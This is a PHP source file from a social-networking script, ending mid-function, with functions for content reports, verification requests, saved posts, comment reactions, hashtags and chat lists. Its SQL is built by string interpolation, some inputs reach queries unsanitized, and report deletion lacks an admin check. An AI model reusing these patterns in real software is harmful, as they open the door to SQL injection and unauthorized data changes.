<?php

/* Script Main Functions (File 2) */
// functions_tww.php
require_once "app_start.php";
use Twilio\Rest\Client;
if (!empty($nrg["config"]["adult_images_file"])) {
    putenv("GOOGLE_APPLICATION_CREDENTIALS=" . $nrg["config"]["adult_images_file"]);
}
use Google\Cloud\Vision\V1\ImageAnnotatorClient;
function NRG_ReportPost($post_data = array()) {
    global $nrg, $sqlConnect, $db;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($post_data)) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $post_id = 0;
    if (isset($post_data["post_id"])) {
        $post_id = NRG_Secure($post_data["post_id"]);
        if (NRG_PostExists($post_data["post_id"]) === false) {
            return false;
        }
    }
    $comment_id = 0;
    if (isset($post_data["comment_id"])) {
        $comment_id = NRG_Secure($post_data["comment_id"]);
    }
    if ($post_id !== 0) {
        if (NRG_IsPostRepotred($post_id, $user_id)) {
            $query_one     = "DELETE FROM " . T_REPORTS . " WHERE `post_id` = {$post_id} AND `user_id` = {$user_id}";
            $sql_query_one = mysqli_query($sqlConnect, $query_one);
            if ($sql_query_one) {
                return "unreport";
            }
        }
    }
    if ($comment_id !== 0) {
        if (NRG_IsCommentRepotred($comment_id, $user_id)) {
            $query_one     = "DELETE FROM " . T_REPORTS . " WHERE `comment_id` = {$comment_id} AND `user_id` = {$user_id}";
            $sql_query_one = mysqli_query($sqlConnect, $query_one);
            if ($sql_query_one) {
                return "unreport";
            }
        }
    }
    $query_two     = "INSERT INTO " . T_REPORTS . " (`user_id`, `post_id`, `comment_id`, `time`) VALUES ({$user_id}, {$post_id}, {$comment_id}, " . time() . ")";
    $sql_query_two = mysqli_query($sqlConnect, $query_two);
    if ($sql_query_two) {
        $notification_data_array = array(
            "recipient_id" => 0,
            "type" => "report",
            "time" => time(),
            "admin" => 1
        );
        $db->insert(T_NOTIFICATION, $notification_data_array);
        return "report";
    }
}
function NRG_CountUnseenReports() {
    global $nrg, $sqlConnect;
    $query_one = "SELECT COUNT(`id`) AS `reports` FROM " . T_REPORTS . " WHERE `seen` = 0 ";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        return $fetched_data["reports"];
    }
    return false;
}
function NRG_UpdateSeenReports() {
    global $nrg, $sqlConnect;
    $query_one = " UPDATE " . T_REPORTS . " SET `seen` = 1 WHERE `seen` = 0";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if ($sql) {
        return true;
    }
}
function NRG_DeleteReport($report_id = "") {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $report_id = NRG_Secure($report_id);
    $query     = mysqli_query($sqlConnect, "DELETE FROM " . T_REPORTS . " WHERE `id` = {$report_id}");
    if ($query) {
        return true;
    }
}
function NRG_GetReports() {
    global $nrg, $sqlConnect;
    $data      = array();
    $query_one = " SELECT * FROM " . T_REPORTS . " ORDER BY `id` DESC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            if ($fetched_data["post_id"] != 0) {
                $fetched_data["reporter"] = NRG_UserData($fetched_data["user_id"]);
                $fetched_data["story"]    = NRG_PostData($fetched_data["post_id"]);
                $fetched_data["type"]     = "post";
                $data[]                   = $fetched_data;
            } elseif ($fetched_data["profile_id"] != 0) {
                $fetched_data["reporter"] = NRG_UserData($fetched_data["user_id"]);
                $fetched_data["user"]     = NRG_UserData($fetched_data["profile_id"]);
                $fetched_data["type"]     = "profile";
                $data[]                   = $fetched_data;
            } elseif ($fetched_data["page_id"] != 0) {
                $fetched_data["reporter"] = NRG_UserData($fetched_data["user_id"]);
                $fetched_data["page"]     = NRG_PageData($fetched_data["page_id"]);
                $fetched_data["type"]     = "page";
                $data[]                   = $fetched_data;
            } elseif ($fetched_data["group_id"] != 0) {
                $fetched_data["reporter"] = NRG_UserData($fetched_data["user_id"]);
                $fetched_data["group"]    = NRG_GroupData($fetched_data["group_id"]);
                $fetched_data["type"]     = "group";
                $data[]                   = $fetched_data;
            } elseif ($fetched_data["comment_id"] != 0) {
                $fetched_data["reporter"] = NRG_UserData($fetched_data["user_id"]);
                $fetched_data["comment"]  = NRG_GetPostComment($fetched_data["comment_id"]);
                $fetched_data["type"]     = "comment";
                $data[]                   = $fetched_data;
            }
        }
    }
    return $data;
}
function NRG_IsPostRepotred($post_id = "", $user_id = "") {
    global $sqlConnect;
    if (empty($post_id) or !is_numeric($post_id) or $post_id < 1) {
        return false;
    }
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $post_id       = NRG_Secure($post_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_REPORTS . " WHERE `post_id` = {$post_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_IsCommentRepotred($comment_id = "", $user_id = "") {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_REPORTS . " WHERE `comment_id` = {$comment_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_CountUnseenVerifications() {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $query_one = "SELECT COUNT(`id`) AS `verifications` FROM " . T_VERIFICATION_REQUESTS . " WHERE `seen` = 0 ";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        return $fetched_data["verifications"];
    }
}
function NRG_UpdateSeenVerifications() {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $query_one = " UPDATE " . T_VERIFICATION_REQUESTS . " SET `seen` = 1 WHERE `seen` = 0";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if ($sql) {
        return true;
    }
}
function NRG_DeleteVerificationRequest($id = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id)) {
        return false;
    }
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $id    = NRG_Secure($id);

    $query_one = "SELECT * FROM " . T_VERIFICATION_REQUESTS . " WHERE `id` = '".$id."'";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        if (file_exists($fetched_data['passport'])) {
            @unlink($fetched_data['passport']);
        }
        if (file_exists($fetched_data['photo'])) {
            @unlink($fetched_data['photo']);
        }
        @NRG_DeleteFromToS3($fetched_data['passport']);
        @NRG_DeleteFromToS3($fetched_data['photo']);
    }

    $query = mysqli_query($sqlConnect, "DELETE FROM " . T_VERIFICATION_REQUESTS . " WHERE `id` = {$id}");
    if ($query) {
        return true;
    }
}
function NRG_DeleteVerification($id = 0, $type = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) || empty($type)) {
        return false;
    }
    if (!in_array($type, array(
        "User",
        "Page"
    ))) {
        return false;
    }
    $id          = NRG_Secure($id);
    $update_data = array(
        "verified" => 0
    );
    $update      = false;
    if ($type == "Page") {
        if (NRG_IsPageOnwer($id)) {
            $update = mysqli_query($sqlConnect, "UPDATE " . T_PAGES . " SET `verified` = '0' WHERE `page_id` = {$id}");
        }
    } elseif ($type == "User") {
        if ($nrg["user"]["user_id"] == $id || NRG_IsAdmin()) {
            $update = mysqli_query($sqlConnect, "UPDATE " . T_USERS . " SET `verified` = '0' WHERE `user_id` = {$id}");
            cache($id, 'users', 'delete');
        }
    }
    if ($update) {
        return true;
    }
}
function NRG_RemoveVerificationRequest($id = 0, $type = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) || empty($type)) {
        return false;
    }
    if (!in_array($type, array(
        "User",
        "Page"
    ))) {
        return false;
    }
    $id = NRG_Secure($id);
    if ($type == "Page") {
        if (NRG_IsPageOnwer($id) === false) {
            return false;
        }
        $type_id = "`page_id`";
        $type_2  = "page";
    } elseif ($type == "User") {
        if (NRG_IsOnwer($id) === false) {
            return false;
        }
        $type_id = "`user_id`";
        $type_2  = "user";
    }
    $delete_query = mysqli_query($sqlConnect, "DELETE FROM " . T_VERIFICATION_REQUESTS . " WHERE {$type_id} = {$id} AND `type` = '{$type_2}'");
    if ($delete_query) {
        return true;
    }
}
function NRG_VerifyUser($id = 0, $verification_id = 0, $type = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) || empty($type) || empty($verification_id)) {
        return false;
    }
    if (!in_array($type, array(
        "User",
        "Page"
    ))) {
        return false;
    }
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $id          = NRG_Secure($id);
    $update_data = array(
        "verified" => 1
    );
    $update      = false;
    if ($type == "Page") {
        $update = NRG_UpdatePageData($id, $update_data);
    } elseif ($type == "User") {
        $update = NRG_UpdateUserData($id, $update_data);
    }
    if ($update) {
        if (NRG_DeleteVerificationRequest($verification_id) === true) {
            return true;
        }
    }
}
function NRG_RequestVerification($id = 0, $type = "") {
    global $sqlConnect, $db;
    if (empty($id) or !is_numeric($id) or $id < 1 or empty($type) or $type != "Page") {
        return false;
    }
    if (NRG_IsVerificationRequests($id, $type) === true) {
        return false;
    }
    $values = "";
    if ($type == "Page") {
        if (NRG_IsPageOnwer($id) === false) {
            return false;
        }
        $values = "`page_id`,`type`";
    } elseif ($type == "User") {
        if (NRG_IsOnwer($id) === false) {
            return false;
        }
        $values = "`user_id`,`type`";
    }
    $query_one = mysqli_query($sqlConnect, "INSERT INTO " . T_VERIFICATION_REQUESTS . " ($values) VALUES({$id},'{$type}') ");
    if ($query_one) {
        $notification_data_array = array(
            "recipient_id" => 0,
            "type" => "verify",
            "time" => time(),
            "admin" => 1
        );
        $db->insert(T_NOTIFICATION, $notification_data_array);
        return true;
    }
}
function NRG_IsVerificationRequests($id = "", $type = "") {
    global $sqlConnect;
    if (empty($id) or !is_numeric($id) or $id < 1) {
        return false;
    }
    if (empty($type)) {
        return false;
    }
    if (!in_array($type, array(
        "User",
        "Page"
    ))) {
        return false;
    }
    $id    = NRG_Secure($id);
    $type  = NRG_Secure($type);
    $where = "";
    if ($type == "Page") {
        $where = " `page_id` = {$id} AND `type` = 'page'";
    } elseif ($type == "User") {
        $where = " `user_id` = {$id} AND `type` = 'user'";
    }
    if (empty($where)) {
        return false;
    }
    $query_one     = "SELECT `id` as count FROM " . T_VERIFICATION_REQUESTS . " WHERE{$where}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) > 0) {
        return true;
    }
}
function NRG_GetVerificationButton($id, $type) {
    global $sqlConnect, $nrg;
    if (empty($id) or !is_numeric($id) or $id < 1) {
        return false;
    }
    if (empty($type)) {
        return false;
    }
    $verified_type = 0;
    if ($type == "Page") {
        $nrg["verification"]       = NRG_PageData($id);
        $nrg["verification"]["id"] = $nrg["verification"]["page_id"];
    } elseif ($type == "User") {
        $nrg["verification"]       = NRG_UserData($id);
        $nrg["verification"]["id"] = $nrg["verification"]["user_id"];
    }
    $nrg["verification"]["type"] = $type;
    $pending                    = "buttons/pending-verification";
    $remove                     = "buttons/remove-verification";
    $request                    = "buttons/request-verification";
    $verified                   = $nrg["verification"]["verified"];
    if (NRG_IsVerificationRequests($id, $type)) {
        return NRG_LoadPage($pending);
    } elseif ($verified == 1) {
        return NRG_LoadPage($remove);
    } else {
        return NRG_LoadPage($request);
    }
}
function NRG_GetVerifications() {
    global $nrg, $sqlConnect;
    $data      = array();
    $query_one = " SELECT * FROM " . T_VERIFICATION_REQUESTS . " ORDER BY `id` DESC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            if (!empty($fetched_data["user_id"])) {
                $fetched_data["request_from"]       = NRG_UserData($fetched_data["user_id"]);
                $fetched_data["request_from"]["id"] = $fetched_data["user_id"];
            } elseif (!empty($fetched_data["page_id"])) {
                $fetched_data["request_from"]       = NRG_PageData($fetched_data["page_id"]);
                $fetched_data["request_from"]["id"] = $fetched_data["page_id"];
            } else {
                return false;
            }
            $fetched_data["type"] = $fetched_data["type"] == "User" ? "User" : "Page";
            $data[]               = $fetched_data;
        }
    }
    return $data;
}
function NRG_GetAllPosts($posts = array("limit" => 10, "after_user_id" => 0)) {
    global $nrg, $sqlConnect;
    $data     = array();
    $subquery = "";
    $limit    = NRG_Secure($posts["limit"]);
    if (isset($posts["after_post_id"]) && !empty($posts["after_post_id"]) && $posts["after_post_id"] > 0) {
        $after_post_id = NRG_Secure($posts["after_post_id"]);
        $subquery      = " WHERE `id` < {$after_post_id}";
    }
    $query_one = " SELECT `id` FROM " . T_POSTS . " {$subquery} ORDER BY `id` DESC LIMIT {$limit}";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $data[] = NRG_PostData($fetched_data["id"], "admin");
        }
    }
    return $data;
}
function NRG_IsPostSaved($post_id, $user_id) {
    global $sqlConnect;
    if (empty($post_id) or !is_numeric($post_id) or $post_id < 1) {
        return false;
    }
    $post_id       = NRG_Secure($post_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_SAVED_POSTS . " WHERE `post_id` = {$post_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_GetSavedPosts($user_id, $after_post_id = 0, $limit = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $data           = array();
    $query_one      = "SELECT `post_id` FROM " . T_SAVED_POSTS . " WHERE `user_id` = {$user_id} ";
    if (isset($after_post_id) && !empty($after_post_id) && is_numeric($after_post_id)) {
        $after_post_id = NRG_Secure($after_post_id);
        $query_one .= " AND post_id < {$after_post_id}";
    }
    $query_one .= " ORDER BY `id` DESC";
    if (isset($limit) && !empty($limit) && is_numeric($limit)) {
        $query_one .= " LIMIT {$limit}";
    }
    $query = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $post = NRG_PostData($fetched_data["post_id"]);
            if (is_array($post)) {
                $data[] = $post;
            }
        }
    }
    return $data;
}
function NRG_GetPostIdFromCommentId($comment_id = 0) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $query_one     = "SELECT `post_id` FROM " . T_COMMENTS . " WHERE `id` = {$comment_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["post_id"];
    }
    return false;
}
function NRG_GetUserIdFromCommentId($comment_id = 0) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $query_one     = "SELECT `user_id` FROM " . T_COMMENTS . " WHERE `id` = {$comment_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["user_id"];
    }
    return false;
}
function NRG_AddCommentLikes($comment_id, $text = "") {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($comment_id) or empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id          = NRG_Secure($comment_id);
    $user_id             = NRG_Secure($nrg["user"]["user_id"]);
    $comment_timeline_id = NRG_GetUserIdFromCommentId($comment_id);
    $post_id             = NRG_GetPostIdFromCommentId($comment_id);
    $page_id             = "";
    $post_data           = NRG_PostData($post_id);
    if (!empty($post_data["page_id"])) {
        $page_id = $post_data["page_id"];
    }
    if (NRG_IsPageOnwer($post_data["page_id"]) === false) {
        $page_id = 0;
    }
    if (empty($comment_timeline_id)) {
        return false;
    }
    $comment_data = NRG_GetPostComment($comment_id);
    $text         = NRG_Secure($comment_data["text"]);
    if (isset($text) && !empty($text)) {
        $text = substr($text, 0, 10) . "..";
    }
    if (NRG_IsCommentLiked($comment_id, $user_id) === true) {
        $query_one = "DELETE FROM " . T_COMMENT_LIKES . " WHERE `comment_id` = {$comment_id} AND `user_id` = {$user_id}";
        mysqli_query($sqlConnect, "DELETE FROM " . T_NOTIFICATION . " WHERE `post_id` = {$post_id} AND `recipient_id` = {$comment_timeline_id} AND `type` = 'liked_comment'");
        $sql_query_one = mysqli_query($sqlConnect, $query_one);
        if ($sql_query_one) {
            return "unliked";
        }
    } else {
        if ($nrg["config"]["second_post_button"] == "dislike" && NRG_IsCommentWondered($comment_id, $user_id)) {
            NRG_AddCommentWonders($comment_id);
        }
        $query_two     = "INSERT INTO " . T_COMMENT_LIKES . " (`user_id`, `post_id`, `comment_id`) VALUES ({$user_id},{$post_id},{$comment_id})";
        $sql_query_two = mysqli_query($sqlConnect, $query_two);
        if ($sql_query_two) {
            $notification_data_array = array(
                "recipient_id" => $comment_timeline_id,
                "post_id" => $post_id,
                "type" => "liked_comment",
                "text" => $text,
                "page_id" => $page_id,
                "url" => "index.php?link1=post&id=" . $post_id . "&ref=" . $comment_id
            );
            NRG_RegisterNotification($notification_data_array);
            return "liked";
        }
    }
}
function NRG_CountCommentLikes($comment_id) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $query_one     = "SELECT COUNT(`id`) AS `likes` FROM " . T_COMMENT_LIKES . " WHERE `comment_id` = {$comment_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["likes"];
    }
    return false;
}
function NRG_IsCommentLiked($comment_id, $user_id) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_COMMENT_LIKES . " WHERE `comment_id` = {$comment_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_AddCommentWonders($comment_id, $text = "") {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($comment_id) or empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id      = NRG_Secure($comment_id);
    $user_id         = NRG_Secure($nrg["user"]["user_id"]);
    $comment_user_id = NRG_GetUserIdFromCommentId($comment_id);
    $post_id         = NRG_GetPostIdFromCommentId($comment_id);
    $page_id         = "";
    $post_data       = NRG_PostData($post_id);
    if (!empty($post_data["page_id"])) {
        $page_id = $post_data["page_id"];
    }
    if (NRG_IsPageOnwer($post_data["page_id"]) === false) {
        $page_id = 0;
    }
    if (empty($comment_user_id)) {
        return false;
    }
    $comment_data = NRG_GetPostComment($comment_id);
    $text         = NRG_Secure($comment_data["text"]);
    if (isset($text) && !empty($text)) {
        $text = mb_substr($text, 0, 10, "UTF-8") . "..";
    }
    if (NRG_IsCommentWondered($comment_id, $nrg["user"]["user_id"]) === true) {
        $query_one = "DELETE FROM " . T_COMMENT_WONDERS . " WHERE `comment_id` = {$comment_id} AND `user_id` = {$user_id}";
        mysqli_query($sqlConnect, "DELETE FROM " . T_NOTIFICATION . " WHERE `post_id` = {$post_id} AND `recipient_id` = {$comment_user_id} AND `type` = 'wondered_comment'");
        $sql_query_one = mysqli_query($sqlConnect, $query_one);
        if ($sql_query_one) {
            return "unwonder";
        }
    } else {
        if ($nrg["config"]["second_post_button"] == "dislike" && NRG_IsCommentLiked($comment_id, $user_id)) {
            NRG_AddCommentLikes($comment_id);
        }
        $query_two     = "INSERT INTO " . T_COMMENT_WONDERS . " (`user_id`, `post_id`, `comment_id`) VALUES ({$user_id}, {$post_id}, {$comment_id})";
        $sql_query_two = mysqli_query($sqlConnect, $query_two);
        if ($sql_query_two) {
            $notification_data_array = array(
                "recipient_id" => $comment_user_id,
                "post_id" => $post_id,
                "type" => "wondered_comment",
                "text" => $text,
                "page_id" => $page_id,
                "url" => "index.php?link1=post&id=" . $post_id . "&ref=" . $comment_id
            );
            NRG_RegisterNotification($notification_data_array);
            return "wonder";
        }
    }
}
function NRG_CountCommentWonders($comment_id) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $query_one     = "SELECT COUNT(`id`) AS `likes` FROM " . T_COMMENT_WONDERS . " WHERE `comment_id` = {$comment_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["likes"];
    }
    return false;
}
function NRG_IsCommentWondered($comment_id, $user_id) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_COMMENT_WONDERS . " WHERE `comment_id` = {$comment_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_GetCommentLikes($comment_id) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $data          = array();
    $query_one     = "SELECT `user_id` FROM " . T_COMMENT_LIKES . " WHERE `comment_id` = {$comment_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($sql_query_one)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_GetCommentWonders($comment_id) {
    global $sqlConnect;
    if (empty($comment_id) or !is_numeric($comment_id) or $comment_id < 1) {
        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $data          = array();
    $query_one     = "SELECT `user_id` FROM " . T_COMMENT_WONDERS . " WHERE `comment_id` = {$comment_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($sql_query_one)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function Wa_GetTrendingHashs($type = "latest", $limit = 5) {
    global $sqlConnect;
    $data = array();
    if (empty($type)) {
        return false;
    }
    if (empty($limit) or !is_numeric($limit) or $limit < 1) {
        $limit = 5;
    }
    if ($type == "latest") {
        $query = "SELECT * FROM " . T_HASHTAGS . " WHERE `expire` >= CURRENT_DATE() AND `trend_use_num` > '0'  ORDER BY `last_trend_time` DESC LIMIT {$limit}";
    } elseif ($type == "popular") {
        $query = "SELECT * FROM " . T_HASHTAGS . " WHERE `expire` >= CURRENT_DATE() AND `trend_use_num` > '0'  ORDER BY `trend_use_num` DESC LIMIT {$limit}";
    }
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query)) {
        $sql_numrows = mysqli_num_rows($sql_query);
        if ($sql_numrows > 0) {
            while ($sql_fetch = mysqli_fetch_assoc($sql_query)) {
                $sql_fetch["url"] = NRG_SeoLink("index.php?link1=hashtag&hash=" . $sql_fetch["tag"]);
                $data[]           = $sql_fetch;
            }
        }
    }
    return $data;
}
function NRG_GetHashtagPosts($s_query, $after_post_id = 0, $limit = 5, $before_post_id = 0) {
    global $sqlConnect;
    $data         = array();
    $search_query = str_replace("#", "", NRG_Secure($s_query));
    $hashdata     = NRG_GetHashtag($search_query, false);
    if (is_array($hashdata) && count($hashdata) > 0) {
        $search_string = "#[" . $hashdata["id"] . "]";
        $query_one     = "SELECT id FROM " . T_POSTS . " WHERE `postText` LIKE '%{$search_string}%'";
        if (isset($after_post_id) && !empty($after_post_id) && is_numeric($after_post_id)) {
            $after_post_id = NRG_Secure($after_post_id);
            $query_one .= " AND id < {$after_post_id}";
        }
        if (isset($before_post_id) && !empty($before_post_id) && is_numeric($before_post_id)) {
            $before_post_id = NRG_Secure($before_post_id);
            $query_one .= " AND id > {$before_post_id}";
        }
        $query_one .= " AND `multi_image_post` = 0  ORDER BY `id` DESC LIMIT {$limit}";
        $sql_query_one = mysqli_query($sqlConnect, $query_one);
        if (mysqli_num_rows($sql_query_one)) {
            while ($sql_fetch_one = mysqli_fetch_assoc($sql_query_one)) {
                $posts = NRG_PostData($sql_fetch_one["id"]);
                if (is_array($posts)) {
                    $data[] = $posts;
                }
            }
        }
    }
    return $data;
}
function NRG_SearchForPosts($id = 0, $s_query = "", $limit = 5, $type = "") {
    global $nrg, $sqlConnect;
    $data = array();
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) || !is_numeric($id) || $id < 1) {
        return false;
    }
    if ($type == "page") {
        $query_type = "AND `page_id` = {$id}";
    } elseif ($type == "user") {
        $query_type = "AND `user_id` = {$id}";
    } elseif ($type == "group") {
        $query_type = "AND `group_id` = {$id}";
    } else {
        return false;
    }
    $search_query = NRG_Secure($s_query);
    $query_one    = "SELECT id FROM " . T_POSTS . " WHERE `postText` LIKE '%{$search_query}%' {$query_type}";
    $query_one .= " ORDER BY `id` DESC LIMIT {$limit}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        while ($sql_fetch_one = mysqli_fetch_assoc($sql_query_one)) {
            $posts = NRG_PostData($sql_fetch_one["id"]);
            if (is_array($posts)) {
                $data[] = $posts;
            }
        }
    }
    return $data;
}
function NRG_GetSerachHash($s_query) {
    global $sqlConnect;
    $search_query = str_replace("#", "", NRG_Secure($s_query));
    $data         = array();
    $query        = mysqli_query($sqlConnect, "SELECT * FROM " . T_HASHTAGS . " WHERE `tag` LIKE '%{$search_query}%' ORDER BY `trend_use_num` DESC LIMIT 10");
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $fetched_data["url"] = NRG_SeoLink("index.php?link1=hashtag&hash=" . $fetched_data["tag"]);
            $data[]              = $fetched_data;
        }
    }
    return $data;
}
function NRG_CountOnlineUsers() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $time    = time() - 60;
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`user_id`) AS `online` FROM " . T_USERS . " WHERE `user_id` IN (SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id`= {$user_id} AND `following_id` <> {$user_id} AND `active` = '1') AND `lastseen` > {$time} AND `active` = '1' AND `user_id` NOT IN (SELECT `blocked` FROM " . T_BLOCKS . " WHERE `blocker` = '{$user_id}') AND `user_id` NOT IN (SELECT `blocker` FROM " . T_BLOCKS . " WHERE `blocked` = '{$user_id}') ORDER BY `lastseen` DESC");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["online"];
    }
    return false;
}
function NRG_GetChatUsers($type) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data = array();
    if ($nrg["config"]["node_socket_flow"] == "1") {
        $time = time() - 03;
    } else {
        $time = time() - 60;
    }
    $user_id    = NRG_Secure($nrg["user"]["user_id"]);
    $query_text = "SELECT `user_id` FROM " . T_USERS . " WHERE `user_id` IN (SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `following_id` <> {$user_id} AND `user_id` NOT IN (SELECT `blocked` FROM " . T_BLOCKS . " WHERE `blocker` = '{$user_id}') AND `user_id` NOT IN (SELECT `blocker` FROM " . T_BLOCKS . " WHERE `blocked` = '{$user_id}') AND `active` = '1')";
    if ($type == "online") {
        $query_text .= " AND `lastseen` > {$time}";
    } elseif ($type == "offline") {
        $query_text .= " AND `lastseen` < {$time}";
    }
    $query_text .= " AND `active` = '1' ORDER BY `lastseen` DESC";
    if ($type == "offline") {
        $query_text .= " LIMIT 6";
    }
    $query = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
